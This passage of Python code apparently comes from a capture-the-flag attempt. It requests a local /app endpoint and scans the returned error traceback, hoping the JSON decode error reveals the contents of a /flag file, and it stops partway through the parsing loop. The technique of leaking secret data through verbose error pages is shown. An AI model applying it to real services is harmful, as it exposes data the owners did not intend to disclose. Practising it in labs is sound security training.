# Try to fetch /app - it will error because /flag doesn't return valid JSON
# But the error message might contain the actual content
response = requests.get('http://127.0.0.1:32905/app')

# Extract the JSON decode error which might contain the actual content
if "JSONDecodeError" in response.text:
    print("Found JSONDecodeError - extracting the content that caused it...")
    print()
    
    # The error traceback might show what was received
    # Look for patterns in the error page
    lines = response.text.split('\n')
    for i, line in enumerate(lines):
        if 'JSONDecodeError' in line or 'Expecting value' in line:
            # Print context around the error
            start = max(0, i-5)
            end = min(len(lines), i+10)
